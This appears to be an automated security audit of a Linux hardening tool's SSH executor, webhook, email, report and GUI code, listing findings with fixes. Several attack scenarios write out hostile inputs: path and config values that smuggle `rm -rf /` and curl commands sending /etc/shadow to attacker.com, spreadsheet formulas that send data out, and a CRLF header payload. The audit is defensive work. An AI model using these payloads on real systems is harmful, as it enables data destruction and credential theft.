# Security Audit: Network & Input Parsing

**Agent:** 5 -- Network & Input Parsing
**Scope:** SSRF, notification injection, XSS, CSV injection, config parsing exploits, SSH security gaps
**Date:** 2026-02-25
**Status:** Complete

---

## Table of Contents

1. [SSH Executor Security](#1-ssh-executor-security)
2. [Webhook / SSRF](#2-webhook--ssrf)
3. [Email / SMTP Injection](#3-email--smtp-injection)
4. [HTML Report XSS](#4-html-report-xss)
5. [CSV Injection](#5-csv-injection)
6. [Config Parsing Exploits](#6-config-parsing-exploits)
7. [Tauri IPC Boundary](#7-tauri-ipc-boundary)
8. [Information Disclosure](#8-information-disclosure)
9. [Denial of Service](#9-denial-of-service)
10. [Prior Finding Validation](#10-prior-finding-validation)

---

## 1. SSH Executor Security

### SA-088 -- SSH Command Injection via Path Traversal in Single-Quote Context (High)

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:105,116,128-131,143,150-153`
- **Description:** All SSH file operations construct shell commands by interpolating `path.display()` inside single quotes (e.g., `format!("cat '{}'", path.display())`). While single quotes prevent most shell metacharacter expansion, a path containing a literal single quote character (`'`) breaks out of the quoting context. For example, a path like `/tmp/foo'; rm -rf /; echo '` would terminate the quote, inject arbitrary commands, and resume quoting.
- **Attack Scenario:** A plugin or config directive could reference a file path containing single-quote characters. Since path values flow from TOML config files (which allow arbitrary string values), a malicious config entry like `[ssh.directives] "Include" = "/tmp/x'; curl attacker.com/exfil?data=$(cat /etc/shadow); echo '"` would cause the SSH executor to execute injected commands on the remote host.
- **Remediation:** Use `shell_escape::escape()` or manually replace `'` with `'\''` in all path values before interpolation. Alternatively, transfer file contents over the SSH channel using `session.sftp()` or `session.raw_command("cat").arg(path)` instead of constructing shell strings.
- **Status:** Open

### SA-089 -- SSH write_file Heredoc Delimiter Injection (High)

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:128-131`
- **Description:** The `write_file` method uses a heredoc with delimiter `HARDENER_EOF`:
  ```rust
  format!("sudo tee '{}' > /dev/null << 'HARDENER_EOF'\n{}\nHARDENER_EOF", path.display(), content)
  ```
  If `content` contains the literal string `\nHARDENER_EOF\n`, it prematurely terminates the heredoc, and subsequent text is interpreted as shell commands. The single-quoted heredoc delimiter (`'HARDENER_EOF'`) disables variable expansion but does not prevent delimiter collision.
- **Attack Scenario:** A hardening plugin writes a configuration file whose content includes `HARDENER_EOF` as text. When the SSH executor sends this to the remote host, the shell interprets the early delimiter termination and executes trailing content as commands. Config directive values from TOML flow directly into file content written by plugins (e.g., sshd_config values, sysctl.conf values).
- **Remediation:** Generate a random heredoc delimiter per invocation (e.g., `format!("HARDENER_EOF_{}", rand::random::<u64>())`), or use SFTP/`stdin` piping via the openssh crate's `raw_command("sudo tee").stdin(content)` approach to avoid shell interpretation entirely.
- **Status:** Open

### SA-090 -- SSH execute_command Arguments Not Shell-Escaped (High)

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:186-193`
- **Description:** The `execute_command` method joins program and arguments with spaces without any escaping:
  ```rust
  format!("{} {}", program, args.join(" "))
  ```
  This passes the concatenated string to `session.raw_command()`, which sends it to the remote shell for interpretation. Any argument containing spaces, semicolons, backticks, or other shell metacharacters will be interpreted by the shell.
- **Attack Scenario:** If a plugin calls `executor.execute_command("sysctl", &["-w", "kernel.core_pattern=|/tmp/exploit"])` the pipe character is interpreted by the shell. More critically, user-provided config directive values that end up as command arguments (e.g., sysctl key=value pairs from `[kernel.directives]`) could inject arbitrary commands.
- **Remediation:** Shell-escape each argument individually using `shell_escape::escape()` before joining, or use the openssh crate's `Command` builder which supports adding arguments individually (similar to `std::process::Command`).
- **Status:** Open

### SA-091 -- --ssh-no-verify Disables Host Key Checking Without Prominent Warning (Medium)

- **Severity:** Medium
- **CWE:** CWE-295 (Improper Certificate Validation)
- **Location:** `crates/hardener-cli/src/cli.rs:53`, `crates/hardener-cli/src/ssh_config.rs:39`, `crates/hardener-core/src/executor/ssh.rs:27`
- **Description:** The `--ssh-no-verify` flag sets `KnownHosts::Accept`, which accepts any host key without verification, including on first connection. While the flag is documented as "insecure", there is no runtime warning emitted when it is used. The default is correctly `KnownHosts::Strict`.
- **Attack Scenario:** A user uses `--ssh-no-verify` for convenience during initial setup, then an attacker performs a MITM attack on subsequent connections. Without a visible warning, the user may not realize they are connecting to a malicious host, which then receives hardening commands (including file writes) that the attacker can observe or modify.
- **Remediation:** Emit a prominent stderr warning when `--ssh-no-verify` is active: `"WARNING: SSH host key verification disabled. Connection is vulnerable to MITM attacks."` Consider also logging this at `warn!` level.
- **Status:** Open

---

## 2. Webhook / SSRF

### SA-092 -- Webhook URL Scheme Not Validated -- SSRF to Internal Networks (High)

- **Severity:** High
- **CWE:** CWE-918 (Server-Side Request Forgery)
- **Location:** `crates/hardener-scheduler/src/notification/webhook.rs:28-39`
- **Description:** The `WebhookNotifier::new()` constructor only checks that `endpoint.url.is_empty()` is false. It does not validate the URL scheme, hostname, or IP address. The `reqwest::Client` will follow any URL, including:
  - `http://169.254.169.254/latest/meta-data/` (AWS instance metadata)
  - `http://metadata.google.internal/computeMetadata/v1/` (GCP metadata)
  - `http://127.0.0.1:6379/` (local Redis)
  - `http://10.0.0.1:8080/admin` (internal services)
  - `file:///etc/shadow` (local file read -- depends on reqwest version)
  - `gopher://` or other exotic schemes
- **Attack Scenario:** An attacker who can modify the TOML config file (either via a compromised user account, supply-chain attack on config management, or social engineering) sets a webhook URL to the cloud metadata endpoint. On the next scheduled scan, the hardener daemon sends a POST request to that endpoint. While the response body is logged on error, the request itself reaches the internal service. On cloud VMs, this can expose IAM credentials.
- **Remediation:**
  1. Validate URL scheme is `https://` only (or `http://` with explicit opt-in config flag like `allow_insecure_http = true`).
  2. Reject private/reserved IP ranges: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `fd00::/8`.
  3. Resolve the hostname and check the resolved IP against the blocklist (to prevent DNS rebinding where `evil.com` resolves to `169.254.169.254`).
  4. Disable redirect following or validate each redirect target against the same rules.
- **Status:** Open

### SA-093 -- Webhook Custom Headers Allow Arbitrary HTTP Header Injection (Medium)

- **Severity:** Medium
- **CWE:** CWE-113 (HTTP Response Splitting / Header Injection)
- **Location:** `crates/hardener-scheduler/src/notification/webhook.rs:204-208`
- **Description:** Custom headers from config are added to the HTTP request without validation:
  ```rust
  for (key, value) in &self.endpoint.headers {
      let expanded = Self::expand_env_vars(value);
      request = request.header(key, expanded);
  }
  ```
  The header keys and values come directly from the TOML config and are not validated. While `reqwest` may reject invalid header names, the header values could contain CRLF sequences (`\r\n`) that could inject additional headers.
- **Attack Scenario:** A malicious config entry adds a header with value `"legit\r\nHost: evil.com\r\n"`, potentially causing the HTTP client to send requests with injected headers. While `reqwest` uses `hyper` which validates header values and rejects bare CR/LF, this is a defence-in-depth concern -- relying on library validation alone is fragile.
- **Remediation:** Validate header keys against `^[a-zA-Z0-9\-]+$` and header values against `^[\x20-\x7E]+$` (printable ASCII only, no control characters). Reject any header containing `\r`, `\n`, or `\0`.
- **Status:** Open

### SA-094 -- Webhook Environment Variable Expansion Can Leak Sensitive Variables (Medium)

- **Severity:** Medium
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **Location:** `crates/hardener-scheduler/src/notification/webhook.rs:46-63`
- **Description:** The `expand_env_vars` function reads arbitrary environment variables referenced by `${VAR_NAME}` in header values and includes them in outgoing HTTP requests. There is no allowlist restricting which environment variables can be accessed. A config entry like `Authorization: Bearer ${HARDENER_SMTP_PASSWORD}` would send the SMTP password to the webhook endpoint.
- **Attack Scenario:** An attacker who can modify the webhook config (or an accidental misconfiguration) references sensitive environment variables such as `${HOME}`, `${USER}`, `${SSH_AUTH_SOCK}`, `${AWS_SECRET_ACCESS_KEY}`, or `${HARDENER_SMTP_PASSWORD}`. These values are then sent as HTTP headers to the webhook endpoint, which may be attacker-controlled.
- **Remediation:** Implement an allowlist of environment variable prefixes that can be expanded (e.g., `HARDENER_WEBHOOK_*`). Alternatively, use a dedicated secrets mechanism (e.g., a separate secrets file) rather than arbitrary environment variable expansion.
- **Status:** Open

### SA-095 -- Webhook Error Response Body Logged Without Size Limit (Low)

- **Severity:** Low
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Location:** `crates/hardener-scheduler/src/notification/webhook.rs:217`
- **Description:** On non-success HTTP responses, the full response body is read:
  ```rust
  let body = response.text().await.unwrap_or_default();
  ```
  A malicious or misconfigured endpoint could return a multi-gigabyte response body, consuming excessive memory.
- **Attack Scenario:** A webhook endpoint returns a very large response body (e.g., 1 GB of data), causing the daemon process to allocate excessive memory and potentially be killed by the OOM killer.
- **Remediation:** Limit the response body read to a reasonable size (e.g., 4 KB): `let body = response.text().await.unwrap_or_default(); let body = &body[..body.len().min(4096)];` or use `response.bytes()` with a size check.
- **Status:** Open

---

## 3. Email / SMTP Injection

### SA-096 -- Email Subject Contains Unsanitised Hostname -- SMTP Header Injection (Medium)

- **Severity:** Medium
- **CWE:** CWE-93 (CRLF Injection / SMTP Header Injection)
- **Location:** `crates/hardener-scheduler/src/notification/email.rs:86-101`
- **Description:** The email subject line includes `summary.host`:
  ```rust
  format!("[{}] Security Scan: {} findings on {}", severity, summary.total_findings, summary.host)
  ```
  The `summary.host` is obtained from `hostname::get()` which reads the system hostname. While the `lettre` crate's `Message::builder().subject()` method should encode the subject properly (RFC 2047), a hostname containing CRLF sequences could theoretically inject additional SMTP headers if the encoding is incomplete. The `lettre` crate does handle this correctly, but the defence relies entirely on the library.
- **Attack Scenario:** On a compromised system where the hostname has been set to include CRLF sequences (e.g., `hostname "server\r\nBCC: attacker@evil.com\r\nSubject: Stolen data"`), the email notification could leak to unintended recipients.
- **Remediation:** Strip or reject control characters (ASCII < 0x20 except TAB) from `summary.host` before interpolation. Apply the same sanitisation to `summary.session_id` and `summary.plugins_scanned` items used in the email body.
- **Status:** Open

### SA-097 -- Email Body Includes Unsanitised File Path (Low)

- **Severity:** Low
- **CWE:** CWE-200 (Information Exposure)
- **Location:** `crates/hardener-scheduler/src/notification/email.rs:127-129`
- **Description:** The email body includes `summary.json_path`:
  ```rust
  if let Some(ref path) = summary.json_path {
      body.push_str(&format!("Full report: {}\n", path));
  }
  ```
  This exposes the absolute filesystem path of the JSON report on the system, which reveals directory structure, username (from XDG paths), and internal naming conventions to email recipients.
- **Attack Scenario:** An email containing `Full report: /home/admin/.local/share/linux-hardener/scans/scan_20260225_020000_abc12345.json` reveals the username `admin` and the application's data directory structure.
- **Remediation:** Either omit the path entirely from emails or only include the filename (not the full path). The file path is only useful to someone with access to the system, and they could find it without the email.
- **Status:** Open

---

## 4. HTML Report XSS

### SA-098 -- HTML Report Finding Severity Not Escaped (Medium)

- **Severity:** Medium
- **CWE:** CWE-79 (Cross-Site Scripting)
- **Location:** `crates/hardener-compliance/src/output/html.rs:112-116`
- **Description:** In the finding row for failed controls, `finding.finding_severity` is rendered directly without escaping:
  ```rust
  html.push_str(&format!(
      "<tr class=\"finding\"><td></td><td colspan=\"2\">-> [{}] {}</td></tr>\n",
      finding.finding_severity,
      html_escape(&finding.finding_title)
  ));
  ```
  While `finding_severity` is an enum (`Severity`) with a controlled `Display` implementation that only produces values like "Critical", "High", "Medium", "Low", "Info", the code pattern is inconsistent -- `finding_title` is escaped but `finding_severity` is not. This is a defence-in-depth concern: if the `Display` implementation ever changes or if a different type with user-influenced data flows through the same code path, XSS becomes possible.
- **Attack Scenario:** Currently low risk because `Severity` is a fieldless enum. However, if future refactoring changes the severity to a string type or adds custom display logic that includes external data, this becomes exploitable. HTML reports may be served by web servers, emailed, or opened in browsers.
- **Remediation:** Apply `html_escape()` to `finding.finding_severity` for consistency. The cost is negligible and eliminates a latent vulnerability.
- **Status:** Open

### SA-099 -- HTML Report framework.full_name() Not Escaped in Title (Low)

- **Severity:** Low
- **CWE:** CWE-79 (Cross-Site Scripting)
- **Location:** `crates/hardener-compliance/src/output/html.rs:33-35`
- **Description:** The report title includes `report.report_framework.full_name()` without HTML escaping:
  ```rust
  html.push_str(&format!(
      "<h1>{} Compliance Report</h1>\n",
      report.report_framework.full_name()
  ));
  ```
  Currently `full_name()` returns static strings ("CIS Benchmark", "DISA STIG", etc.), so this is safe. However, the subtitle on line 38-40 correctly uses `html_escape()` while the title does not, creating an inconsistent pattern.
- **Attack Scenario:** If `full_name()` ever returns user-configurable data (e.g., custom framework names), this would be exploitable. Currently benign.
- **Remediation:** Apply `html_escape()` to `report.report_framework.full_name()` for consistency with the subtitle handling on line 39.
- **Status:** Open

---

## 5. CSV Injection

### SA-100 -- CSV Output Vulnerable to Formula Injection (Medium)

- **Severity:** Medium
- **CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)
- **Location:** `crates/hardener-compliance/src/output/csv.rs:110-116`
- **Description:** The `escape_csv_field` function handles commas, quotes, and newlines but does not protect against formula injection. When a CSV cell begins with `=`, `+`, `-`, or `@`, spreadsheet applications (Excel, LibreOffice Calc, Google Sheets) interpret it as a formula. The function:
  ```rust
  fn escape_csv_field(field: &str) -> String {
      if field.contains(',') || field.contains('"') || field.contains('\n') {
          format!("\"{}\"", field.replace('"', "\"\""))
      } else {
          field.to_string()
      }
  }
  ```
  Even when quoted, Excel still evaluates formulas. A cell value like `=cmd|'/C calc'!A0` (DDE injection) or `=HYPERLINK("http://evil.com/steal?data="&A1)` will be executed.
- **Attack Scenario:** A plugin produces a finding whose `control_title` or `control_section` begins with a formula character (e.g., a custom directive with title `=IMPORTXML("http://attacker.com/exfil","//"&A1)`). When the compliance report is exported as CSV and opened in a spreadsheet, the formula executes. Whilst the data currently comes from compiled Rust structs (low risk), config-influenced data (custom directives, exception reasons) could flow through if compliance reporting is extended.
- **Remediation:** Prefix cells that start with `=`, `+`, `-`, `@`, `\t`, or `\r` with a single quote (`'`) or a tab character. Alternatively, prefix with a space. The OWASP recommendation is to prepend a tab character (`\t`) inside the quoted field.
- **Status:** Open

### SA-101 -- CSV control_id Field Not Escaped (Low)

- **Severity:** Low
- **CWE:** CWE-1236 (Formula Injection in CSV)
- **Location:** `crates/hardener-compliance/src/output/csv.rs:51-60`
- **Description:** The `control.control_id` field is written directly to CSV without passing through `escape_csv_field`:
  ```rust
  output.push_str(&format!(
      "{},{},{},{},{},{},{},{}\n",
      report.report_framework,     // not escaped
      framework_name,              // escaped
      framework_desc,              // escaped
      control.control_id,          // NOT escaped
      title_escaped,               // escaped
      section_escaped,             // escaped
      status_str,                  // enum - safe
      control.control_findings.len()  // number - safe
  ));
  ```
  While `control_id` values are currently numeric strings like "1.5.1", and `report.report_framework` is an enum Display, the inconsistency means that if control IDs ever contain commas, quotes, or formula characters, the CSV output would be malformed or exploitable.
- **Remediation:** Pass `control.control_id` and `report.report_framework` through `escape_csv_field()` for consistency.
- **Status:** Open

---

## 6. Config Parsing Exploits

### SA-102 -- No Size Limit on TOML Config File Parsing (Medium)

- **Severity:** Medium
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Location:** `crates/hardener-core/src/config_loader.rs:104-119`
- **Description:** The `load_from_file` method reads the entire config file into memory with `std::fs::read_to_string(path)` and then parses it with `toml::from_str`. There is no size limit on the config file. A malicious config file could be extremely large (e.g., gigabytes), causing excessive memory allocation and potential OOM.
- **Attack Scenario:** An attacker who can write to `/etc/linux-hardener/config.toml` or the user config path places a multi-gigabyte file. When the hardener CLI or daemon starts, it reads the entire file into memory and attempts to parse it, causing OOM or excessive resource consumption.
- **Remediation:** Check the file size before reading (e.g., `if metadata.len() > 1_048_576 { return Err("Config file exceeds 1 MB limit") }`). A reasonable config file should be well under 100 KB.
- **Status:** Open

### SA-103 -- Deeply Nested TOML Structures Not Bounded (Low)

- **Severity:** Low
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Location:** `crates/hardener-core/src/config_loader.rs:104-119`, `crates/hardener-scheduler/src/config.rs:34-48`
- **Description:** The `toml` crate deserialises into typed Rust structs, which inherently limits nesting depth to the struct hierarchy. However, HashMap fields like `PluginConfig.directives`, `PluginConfig.exceptions`, and `WebhookEndpoint.headers` accept arbitrary numbers of entries. A config with millions of entries in these maps would cause excessive memory usage during parsing.
- **Attack Scenario:** A malicious config file contains `[ssh.directives]` with 10 million entries, each with long keys and values. The `toml` crate will allocate a HashMap with all these entries, consuming excessive memory.
- **Remediation:** After parsing, validate that `directives.len()`, `custom_directives.len()`, `exceptions.len()`, and `headers.len()` are within reasonable bounds (e.g., < 1000). Log a warning and truncate or reject if exceeded.
- **Status:** Open

### SA-104 -- Config Directive Values Flow Unsanitised to Shell Commands (High)

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `crates/hardener-core/src/config.rs:53-55` (source), `crates/hardener-core/src/executor/ssh.rs:186-192` (sink)
- **Description:** `PluginConfig.directives` is a `HashMap<String, String>` populated directly from TOML config. These values are used by plugins to construct system commands. For example, the kernel plugin uses directives as sysctl key=value pairs, and the SSH plugin uses them as sshd_config directives. When these values reach the SSH executor's `execute_command`, they are concatenated into a shell command string without escaping (see SA-090).
- **Attack Scenario:** A config file contains:
  ```toml
  [kernel.directives]
  "net.ipv4.ip_forward" = "0; curl attacker.com/$(cat /etc/shadow | base64)"
  ```
  When the kernel plugin calls `executor.execute_command("sysctl", &["-w", "net.ipv4.ip_forward=0; curl ..."])`, the SSH executor concatenates this into a shell command, and the injected curl command exfiltrates `/etc/shadow`.
- **Remediation:** This is the same root cause as SA-090 but traced from source to sink. Fix the shell escaping in the SSH executor (SA-090) and additionally validate directive values against allowlists at the plugin level (e.g., kernel directives should only contain alphanumeric characters, dots, underscores, and simple values).
- **Status:** Open

### SA-105 -- Environment Variable Override Lacks Input Validation (Low)

- **Severity:** Low
- **CWE:** CWE-20 (Improper Input Validation)
- **Location:** `crates/hardener-core/src/config_loader.rs:172-179`
- **Description:** The `apply_env_overrides` method reads `HARDENER_DISABLED_PLUGINS` and `HARDENER_ENABLED_PLUGINS` environment variables and uses them to override the config. The values are split on commas and trimmed, but no validation is performed on the resulting plugin IDs. Invalid plugin IDs are silently accepted.
- **Attack Scenario:** An attacker who can set environment variables (e.g., through a shared hosting environment) sets `HARDENER_DISABLED_PLUGINS=kernel-hardening,ssh-hardening,firewall-hardening` to silently disable critical security plugins.
- **Remediation:** Log a warning for each unrecognised plugin ID in the environment variable list. Consider also validating against the known plugin registry.
- **Status:** Open

---

## 7. Tauri IPC Boundary

### SA-106 -- Tauri run_apply Passes GUI Plugin IDs to Shell via pkexec Without Validation (High)

- **Severity:** High
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `src-tauri/src/commands.rs:349-386`
- **Description:** The `run_apply` Tauri command receives `plugin_ids: Vec<String>` from the WASM frontend and passes them as arguments to `pkexec hardener apply --plugin <id>`:
  ```rust
  let plugin_args: Vec<String> = plugin_ids
      .iter()
      .flat_map(|id| vec!["--plugin".to_string(), id.clone()])
      .collect();
  ```
  These IDs are passed to `Command::new("pkexec").arg(&binary).args(args)`. Since `tokio::process::Command` passes arguments individually (not through a shell), this is safe against shell injection. However, the plugin IDs are not validated before being passed to the privileged CLI process. A malicious IPC message could send arbitrary strings as plugin IDs.
- **Attack Scenario:** While `tokio::process::Command` is safe against shell injection (each argument is passed directly to `execve`), the concern is that arbitrary strings flow to the privileged `hardener` CLI process. The CLI's `clap` parser will reject unknown values for `--plugin`, but the error messages may leak information, and the pkexec prompt will still appear (prompting the user for their password for a no-op operation).
- **Remediation:** Validate `plugin_ids` against the known plugin registry before constructing the command. Reject any ID that doesn't match `^[a-z\-]+$` or isn't in the known plugin list.
- **Status:** Open

### SA-107 -- Tauri config_path Parameter Allows Arbitrary File Read (Medium)

- **Severity:** Medium
- **CWE:** CWE-22 (Path Traversal)
- **Location:** `src-tauri/src/commands.rs:264,352,396`
- **Description:** Several Tauri commands accept an optional `config_path: Option<String>` parameter from the frontend. In `run_apply`, this path is passed to `pkexec hardener apply --config <path>`, which causes the privileged CLI to read and parse the file at that path. In `run_scan`, the path is passed to `ConfigLoader::new().with_cli_config(PathBuf::from(path))`, which reads the file as the current user.
- **Attack Scenario:** A compromised or malicious frontend could pass `config_path = "/etc/shadow"` to trigger the privileged CLI to attempt to parse it as TOML. The TOML parsing error message would include details about the file content format, potentially leaking the first few characters. More practically, it could point to a crafted malicious config file placed elsewhere on disk.
- **Remediation:** Validate that `config_path` is within the expected config directories (`/etc/linux-hardener/` or `~/.config/linux-hardener/`). Reject paths containing `..` or pointing outside the expected directories.
- **Status:** Open

### SA-108 -- Tauri checkpoint_id and session_id Not Validated (Low)

- **Severity:** Low
- **CWE:** CWE-20 (Improper Input Validation)
- **Location:** `src-tauri/src/commands.rs:452-471,548-566,743-751,802-824`
- **Description:** Several Tauri commands accept `checkpoint_id: String` or `session_id: String` from the frontend without validating the format. These are expected to be UUIDs but no regex or format check is performed. In `delete_checkpoint`, the ID is passed to `pkexec hardener checkpoint delete <id>` as a command argument. Since `Command` arguments are not shell-interpreted, this is safe against injection, but arbitrary strings still flow to the privileged process.
- **Remediation:** Validate that IDs match the UUID format `^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$` before use.
- **Status:** Open

### SA-109 -- Tauri save_remote_host Accepts Arbitrary SSH Connection Parameters (Medium)

- **Severity:** Medium
- **CWE:** CWE-20 (Improper Input Validation)
- **Location:** `src-tauri/src/commands.rs:854-862`
- **Description:** The `save_remote_host` command accepts a `RemoteHostProfile` struct from the frontend and writes it directly to the hosts TOML config. The hostname, port, user, and key_file fields are not validated. A malicious profile with `hostname = "127.0.0.1"` and `port = 22` could be used to scan the local SSH server. The `key_file` field could reference any file on disk.
- **Attack Scenario:** An attacker exploiting an XSS vulnerability in the GUI frontend (or a compromised WASM module) saves a host profile with `key_file = "/etc/ssl/private/server.key"` and `hostname = "attacker.com"`. When the user connects to this "profile", the SSH client reads the private key file and uses it to authenticate to the attacker's server (leaking the key in the SSH handshake).
- **Remediation:** Validate hostname format (no shell metacharacters, valid DNS or IP). Validate port range (1-65535). Validate `key_file` path is within `~/.ssh/` or a configured key directory. Validate `user` contains only alphanumeric characters and underscores.
- **Status:** Open

### SA-110 -- Tauri create_checkpoint Passes Name Directly to pkexec CLI (Low)

- **Severity:** Low
- **CWE:** CWE-78 (OS Command Injection)
- **Location:** `src-tauri/src/commands.rs:526-541`
- **Description:** The `create_checkpoint` command passes the `name` parameter from the frontend directly to the privileged CLI:
  ```rust
  let args = vec!["checkpoint", "create", "--format", "json", &name];
  ```
  Since `tokio::process::Command` passes arguments individually via `execve`, shell injection is not possible. However, the checkpoint name is not validated for content (e.g., it could contain control characters, very long strings, or empty strings).
- **Remediation:** Validate the checkpoint name length (e.g., 1-255 characters) and content (alphanumeric, hyphens, underscores, spaces only).
- **Status:** Open

---

## 8. Information Disclosure

### SA-111 -- SSH Connection Error Messages May Leak Sensitive Details (Low)

- **Severity:** Low
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **Location:** `crates/hardener-core/src/executor/ssh.rs:59-62`
- **Description:** SSH connection errors include the full error chain from the `openssh` crate:
  ```rust
  .with_context(|| format!("Failed to connect to {}", config.host))
  ```
  The underlying error may include details about host key mismatches, authentication methods tried, identity file paths, and SSH client version information. This error propagates to the CLI output and potentially to the GUI via Tauri IPC.
- **Attack Scenario:** An error message like `Failed to connect to server.internal: Host key verification failed. Expected: SHA256:xxxx, Got: SHA256:yyyy` reveals cryptographic fingerprints and internal hostnames.
- **Remediation:** Wrap SSH connection errors with a generic message for user-facing output while logging the detailed error at debug level: `anyhow::bail!("SSH connection failed. Run with RUST_LOG=debug for details.")`.
- **Status:** Open

### SA-112 -- Tauri Error Strings Returned to Frontend Contain Internal Paths (Low)

- **Severity:** Low
- **CWE:** CWE-209 (Error Message Information Disclosure)
- **Location:** `src-tauri/src/commands.rs` (multiple `.map_err(|e| e.to_string())` calls)
- **Description:** Throughout the Tauri commands, errors are converted to strings with `.map_err(|e| e.to_string())` or `.map_err(|e| format!("...{e}"))` and returned to the frontend. These error strings may contain:
  - Database file paths (e.g., `/home/user/.local/share/linux-hardener/checkpoints.db`)
  - Config file paths
  - Internal error details from SQLite, openssh, or other libraries
- **Attack Scenario:** Information useful for reconnaissance is exposed to the frontend, which could be observed by an attacker through browser developer tools or a compromised WASM module.
- **Remediation:** Define a set of user-friendly error codes/messages and map internal errors to these. Log detailed errors with `tracing::error!` but return only the user-facing message.
- **Status:** Open

---

## 9. Denial of Service

### SA-113 -- Webhook Notification Has No Retry Limit or Circuit Breaker (Low)

- **Severity:** Low
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Location:** `crates/hardener-scheduler/src/notification/dispatcher.rs:98-128`
- **Description:** The dispatcher sends to each notifier sequentially and logs results. There is no retry logic (good), but also no circuit breaker. If a webhook endpoint is slow (responds just before the 30-second timeout), the notification dispatch for a single scan could take `30 * N` seconds for N configured webhooks, blocking the scan runner during that time.
- **Attack Scenario:** An attacker configures multiple webhook endpoints that are slow to respond, causing the daemon to spend minutes on notification dispatch after each scan, potentially causing scan schedule overlap and resource exhaustion.
- **Remediation:** Add a total notification dispatch timeout (e.g., 60 seconds total across all channels). Send to channels in parallel using `tokio::join!` or `FuturesUnordered` with a global timeout.
- **Status:** Open

### SA-114 -- JSON Store Session ID Not Validated for Path Safety (Low)

- **Severity:** Low
- **CWE:** CWE-22 (Path Traversal)
- **Location:** `crates/hardener-scheduler/src/json_store.rs:38-41`
- **Description:** The `write` method uses `session_id` to construct a filename:
  ```rust
  let prefix = &session_id[..session_id.len().min(8)];
  let filename = format!("scan_{}_{}.json", timestamp, prefix);
  ```
  If `session_id` contains path separators (e.g., `../../etc/cron.d/backdoor`), the prefix extraction (`session_id[..8]`) would be `../../etc/` and the resulting path could write outside the output directory. However, the session ID is generated by the database layer (`uuid::Uuid::new_v4()`), so this requires the database to be compromised.
- **Attack Scenario:** If the session ID generation is compromised or if the function is called with an externally-supplied ID, a path traversal write could occur.
- **Remediation:** Validate that `session_id` matches the UUID format or sanitise it by replacing any character not in `[a-zA-Z0-9\-]` with an underscore before using it in the filename.
- **Status:** Open

---

## 10. Prior Finding Validation

### SA-007 (Prior) -- Webhook URLs Not Validated for Scheme -- CONFIRMED AND EXPANDED

- **Original Severity:** Medium
- **Updated Severity:** High
- **Validation:** Confirmed. SA-092 in this report expands the analysis. The webhook URL undergoes zero validation beyond emptiness check. No scheme validation, no IP blocklist, no DNS rebinding protection. The `reqwest::Client` is created with defaults that follow redirects (up to 10 by default), meaning even an initial HTTPS URL could redirect to `http://169.254.169.254`. Elevated from Medium to High because cloud metadata SSRF is a well-known critical attack vector.
- **Status:** Superseded by SA-092

### SA-001 through SA-003 (Prior) -- SSH Executor Command/Argument/Heredoc Injection -- CONFIRMED AND EXPANDED

- **Original Severity:** High
- **Updated Severity:** High
- **Validation:** Confirmed. SA-088, SA-089, and SA-090 in this report provide the detailed analysis. Key additional findings:
  1. SA-088 traces the single-quote escaping weakness for all 5 path-interpolating methods (`read_file`, `read_file_optional`, `write_file`, `path_exists`, `file_metadata`).
  2. SA-089 identifies the specific heredoc delimiter collision vector that was not fully detailed previously.
  3. SA-090 identifies that `execute_command` performs no escaping at all on its arguments, making it the highest-risk vector.
  4. SA-104 traces config directive values (from TOML) through plugins to the SSH executor, establishing a complete source-to-sink injection path.
- **Status:** Superseded by SA-088, SA-089, SA-090, SA-104

### SA-021 through SA-024 (Prior) -- Config Directive Values Unsanitised -- CONFIRMED

- **Validation:** Confirmed. SA-104 traces the complete data flow from `PluginConfig.directives` (populated from TOML) through plugin code to the SSH executor's `execute_command`. The `HashMap<String, String>` type accepts any string value, and the SSH executor concatenates arguments without escaping.
- **Status:** Superseded by SA-104

### SA-026 through SA-028 (Prior) -- GUI Inputs Cross Tauri->pkexec Boundary Without Validation -- CONFIRMED AND EXPANDED

- **Validation:** Confirmed. SA-106 through SA-110 provide detailed analysis of each Tauri command that passes frontend data to privileged operations. Key additional finding: while `tokio::process::Command` prevents shell injection (arguments are passed via `execve`, not shell), the lack of input validation means arbitrary strings still reach the privileged CLI process. The `config_path` parameter (SA-107) is the most concerning because it can cause the privileged process to read arbitrary files.
- **Status:** Superseded by SA-106 through SA-110

---

## Summary

| ID | Severity | Category | Location |
|----|----------|----------|----------|
| SA-088 | High | SSH Injection | `executor/ssh.rs:105` |
| SA-089 | High | SSH Injection | `executor/ssh.rs:128` |
| SA-090 | High | SSH Injection | `executor/ssh.rs:186` |
| SA-091 | Medium | SSH Security | `cli.rs:53` |
| SA-092 | High | SSRF | `webhook.rs:28` |
| SA-093 | Medium | Header Injection | `webhook.rs:204` |
| SA-094 | Medium | Info Disclosure | `webhook.rs:46` |
| SA-095 | Low | DoS | `webhook.rs:217` |
| SA-096 | Medium | SMTP Injection | `email.rs:86` |
| SA-097 | Low | Info Disclosure | `email.rs:127` |
| SA-098 | Medium | XSS | `html.rs:112` |
| SA-099 | Low | XSS | `html.rs:33` |
| SA-100 | Medium | CSV Injection | `csv.rs:110` |
| SA-101 | Low | CSV Injection | `csv.rs:51` |
| SA-102 | Medium | DoS / Config | `config_loader.rs:104` |
| SA-103 | Low | DoS / Config | `config_loader.rs:104` |
| SA-104 | High | Command Injection | `config.rs:53` -> `ssh.rs:186` |
| SA-105 | Low | Input Validation | `config_loader.rs:172` |
| SA-106 | High | IPC Injection | `commands.rs:349` |
| SA-107 | Medium | Path Traversal | `commands.rs:264` |
| SA-108 | Low | Input Validation | `commands.rs:452` |
